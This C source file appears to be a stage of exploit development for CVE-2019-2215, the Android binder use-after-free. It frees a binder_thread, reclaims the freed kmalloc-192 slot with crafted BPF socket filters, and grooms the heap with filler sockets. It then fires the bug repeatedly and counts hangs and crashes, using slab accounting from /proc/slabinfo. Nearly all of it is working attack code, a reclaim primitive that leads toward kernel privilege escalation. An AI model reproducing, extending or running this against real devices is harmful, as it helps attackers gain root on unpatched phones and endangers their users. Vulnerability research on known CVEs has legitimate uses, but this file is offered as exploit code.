/*
 * bpf_reclaim_v2.c — Definitive BPF reclaim test for CVE-2019-2215.
 *
 * KEY INSIGHT: Both binder_thread and sk_filter(20 insns) are in kmalloc-192.
 * Socket MUST be created BEFORE binder_thread free to avoid socket()
 * stealing the freed slot from the per-CPU freelist.
 *
 * If BPF reclaims: spinlock at offset 44 is non-zero → close(epfd) hangs → SIGALRM
 * If no reclaim: spinlock at offset 44 is still 0 (old binder_thread data) → completes
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <sys/wait.h>
#include <linux/filter.h>

#define BINDER_THREAD_EXIT  0x40046208
#define BINDER_SET_MAX_THREADS 0x40046205

struct slab_info {
    long k128, k192, k256;
};

static void read_slabs(struct slab_info *s) {
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[256];
    s->k128 = s->k192 = s->k256 = 0;
    while (fgets(line, sizeof(line), f)) {
        long active; char name[64];
        if (sscanf(line, "%63s %ld", name, &active) == 2) {
            if (!strcmp(name, "kmalloc-128")) s->k128 = active;
            if (!strcmp(name, "kmalloc-192")) s->k192 = active;
            if (!strcmp(name, "kmalloc-256")) s->k256 = active;
        }
    }
    fclose(f);
}

/* BPF filter with recognizable non-zero data at spinlock position (offset 44).
 * Header = 12 or 20 bytes. insns[3] is at offset 36 (hdr=12) or 44 (hdr=20).
 * We make insns[3] AND insns[4] non-zero to cover both cases. */
static void make_detector_bpf(struct sock_filter *insns, int count) {
    memset(insns, 0, count * sizeof(struct sock_filter));
    
    /* insns[0-2]: LD_IMM with k=0 (zeroes at offsets 12-35) */
    for (int j = 0; j < 3; j++)
        insns[j].code = 0x00; /* BPF_LD|BPF_IMM */
    
    /* insns[3] at offset either 36 or 44: make code non-zero */
    insns[3].code = 0x15; /* JEQ_K → internal becomes BPF_S_JMP_JEQ_K (~0x26) */
    insns[3].jt = 0xAA;
    insns[3].jf = 0xBB;
    insns[3].k = 0xDEADBEEF;
    
    /* insns[4] at offset either 44 or 52: also non-zero */
    insns[4].code = 0x15;
    insns[4].jt = 0xCC;
    insns[4].jf = 0xDD;
    insns[4].k = 0xCAFEBABE;
    
    /* insns[5-N-2]: non-zero throughout */
    for (int j = 5; j < count - 1; j++) {
        insns[j].code = 0x00; /* LD_IMM */
        insns[j].k = 0xAA000000 + j;
    }
    
    /* last instruction: RET ACCEPT */
    insns[count - 1].code = 0x06; /* BPF_RET|BPF_K */
    insns[count - 1].k = 0xFFFF;
}

static int run_test(int test_num, int num_fill, int num_insns, int pre_drain) {
    pid_t pid = fork();
    if (pid == 0) {
        alarm(3);
        
        cpu_set_t cs;
        CPU_ZERO(&cs);
        CPU_SET(0, &cs);
        sched_setaffinity(0, sizeof(cs), &cs);
        
        /* === Phase 0: Pre-create UDP socket (BEFORE binder) ===
         * This ensures socket() doesn't steal the freed slot. */
        int det_sock = socket(AF_INET, SOCK_DGRAM, 0);
        
        /* === Phase 1: Optional slab fill ===
         * Fill k192 to ensure binder_thread and BPF share the same slab page. */
        int *fill_socks = NULL;
        struct sock_filter fill_insns[20];
        memset(fill_insns, 0, sizeof(fill_insns));
        fill_insns[19].code = 0x06;
        fill_insns[19].k = 0xFFFF;
        struct sock_fprog fill_prog = { .len = 20, .filter = fill_insns };
        
        if (num_fill > 0) {
            fill_socks = malloc(num_fill * sizeof(int));
            for (int i = 0; i < num_fill; i++) {
                fill_socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
                setsockopt(fill_socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                          &fill_prog, sizeof(fill_prog));
            }
            
            /* Optional: drain some to create LIFO holes */
            if (pre_drain > 0) {
                for (int i = num_fill - pre_drain; i < num_fill; i++) {
                    close(fill_socks[i]);
                    fill_socks[i] = -1;
                }
            }
        }
        
        /* === Phase 2: Create binder_thread (fills a k192 slot) === */
        int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
        uint32_t mx = 0;
        ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);
        int epfd = epoll_create1(O_CLOEXEC);
        struct epoll_event ev = { .events = EPOLLIN };
        epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
        
        /* === Phase 3: Free binder_thread === */
        int thr = 0;
        ioctl(bfd, BINDER_THREAD_EXIT, &thr);
        
        /* === Phase 4: IMMEDIATELY reclaim with BPF (no socket() between!) === */
        struct sock_filter det_insns[20];
        make_detector_bpf(det_insns, num_insns);
        struct sock_fprog det_prog = { .len = num_insns, .filter = det_insns };
        setsockopt(det_sock, SOL_SOCKET, SO_ATTACH_FILTER,
                  &det_prog, sizeof(det_prog));
        
        /* === Phase 5: UAF trigger ===
         * close(epfd) → ep_free → ep_unregister_pollwait → ep_remove_wait_queue
         * → spin_lock_irqsave on freed binder_thread->wait.lock (offset 44)
         * If BPF reclaimed: non-zero at offset 44 → spin_lock hangs → SIGALRM */
        close(epfd);
        
        /* If we reach here, no hang = no reclaim */
        close(det_sock);
        if (fill_socks) {
            for (int i = 0; i < num_fill; i++)
                if (fill_socks[i] >= 0) close(fill_socks[i]);
            free(fill_socks);
        }
        close(bfd);
        _exit(0);
    }
    
    int status;
    waitpid(pid, &status, 0);
    
    if (WIFSIGNALED(status)) {
        if (WTERMSIG(status) == 14) return 1; /* SIGALRM = hang = reclaimed! */
        if (WTERMSIG(status) == 11) return 2; /* SIGSEGV = crash */
        return 3; /* other signal */
    }
    return 0; /* completed = no reclaim */
}

int main() {
    printf("=== BPF Reclaim v2 (k192 targeted, socket pre-created) ===\n\n");

    /* Pin parent to CPU 0 */
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpuset), &cpuset);

    /* TEST A: Direct reclaim, no grooming, 20 insns */
    printf("--- TEST A: Direct reclaim (20 insns, no groom) ---\n");
    int hangs = 0, crashes = 0;
    for (int i = 0; i < 100; i++) {
        int r = run_test(i, 0, 20, 0);
        if (r == 1) hangs++;
        if (r == 2) crashes++;
    }
    printf("  100 attempts: %d hangs, %d crashes\n", hangs, crashes);

    /* TEST B: Groomed — 200 fill, 5 drain */
    printf("\n--- TEST B: Groomed reclaim (200 fill, 5 drain) ---\n");
    hangs = 0; crashes = 0;
    for (int i = 0; i < 100; i++) {
        int r = run_test(i, 200, 20, 5);
        if (r == 1) hangs++;
        if (r == 2) crashes++;
    }
    printf("  100 attempts: %d hangs, %d crashes\n", hangs, crashes);

    /* TEST C: Different BPF sizes (18, 19, 21 insns) */
    printf("\n--- TEST C: Different BPF sizes ---\n");
    for (int insns = 18; insns <= 22; insns++) {
        hangs = 0; crashes = 0;
        for (int i = 0; i < 50; i++) {
            int r = run_test(i, 200, insns, 5);
            if (r == 1) hangs++;
            if (r == 2) crashes++;
        }
        printf("  %d insns: %d hangs, %d crashes out of 50\n", insns, hangs, crashes);
    }

    /* TEST D: Slab accounting — verify BPF lands in same place as binder_thread */
    printf("\n--- TEST D: Step-by-step slab accounting ---\n");
    {
        struct slab_info s0, s1, s2, s3, s4;
        
        /* Pre-create socket */
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        
        read_slabs(&s0);
        
        /* Create binder_thread */
        int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
        uint32_t mx = 0;
        ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);
        int epfd = epoll_create1(O_CLOEXEC);
        struct epoll_event ev = { .events = EPOLLIN };
        epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
        read_slabs(&s1);
        printf("  After binder_thread create: k192=%+ld k256=%+ld\n",
               s1.k192 - s0.k192, s1.k256 - s0.k256);
        
        /* Free binder_thread */
        int thr = 0;
        ioctl(bfd, BINDER_THREAD_EXIT, &thr);
        read_slabs(&s2);
        printf("  After THREAD_EXIT:          k192=%+ld k256=%+ld\n",
               s2.k192 - s0.k192, s2.k256 - s0.k256);
        
        /* BPF attach (should reclaim) */
        struct sock_filter det_insns[20];
        make_detector_bpf(det_insns, 20);
        struct sock_fprog prog = { .len = 20, .filter = det_insns };
        setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
        read_slabs(&s3);
        printf("  After BPF attach:           k192=%+ld k256=%+ld\n",
               s3.k192 - s0.k192, s3.k256 - s0.k256);
        
        /* close(epfd) — UAF */
        close(epfd);
        read_slabs(&s4);
        printf("  After close(epfd):          k192=%+ld k256=%+ld\n",
               s4.k192 - s0.k192, s4.k256 - s0.k256);
        
        close(sock);
        close(bfd);
    }
    
    /* TEST E: Many sequential binder_threads to flush per-CPU cache */
    printf("\n--- TEST E: Flush per-CPU + reclaim ---\n");
    hangs = 0; crashes = 0;
    for (int attempt = 0; attempt < 50; attempt++) {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(3);
            cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0, &cs);
            sched_setaffinity(0, sizeof(cs), &cs);
            
            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            
            /* Create and destroy 100 binder_threads to flush per-CPU cache */
            for (int i = 0; i < 100; i++) {
                int bf = open("/dev/binder", O_RDWR | O_CLOEXEC);
                uint32_t mx = 0;
                ioctl(bf, BINDER_SET_MAX_THREADS, &mx);
                int ep = epoll_create1(O_CLOEXEC);
                struct epoll_event ev = { .events = EPOLLIN };
                epoll_ctl(ep, EPOLL_CTL_ADD, bf, &ev);
                int thr = 0;
                ioctl(bf, BINDER_THREAD_EXIT, &thr);
                close(ep);
                close(bf);
            }
            
            /* Now do the actual test */
            int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
            uint32_t mx = 0;
            ioctl(bfd, BINDER_SET_MAX_THREADS, &mx);
            int epfd = epoll_create1(O_CLOEXEC);
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
            
            int thr = 0;
            ioctl(bfd, BINDER_THREAD_EXIT, &thr);
            
            struct sock_filter det_insns[20];
            make_detector_bpf(det_insns, 20);
            struct sock_fprog prog = { .len = 20, .filter = det_insns };
            setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
            
            close(epfd);
            close(sock); close(bfd);
            _exit(0);
        }
        int status;
        waitpid(pid, &status, 0);
        if (WIFSIGNALED(status) && WTERMSIG(status) == 14) hangs++;
        if (WIFSIGNALED(status) && WTERMSIG(status) == 11) crashes++;
    }
    printf("  50 attempts: %d hangs, %d crashes\n", hangs, crashes);

    printf("\n=== Done ===\n");
    return 0;
}
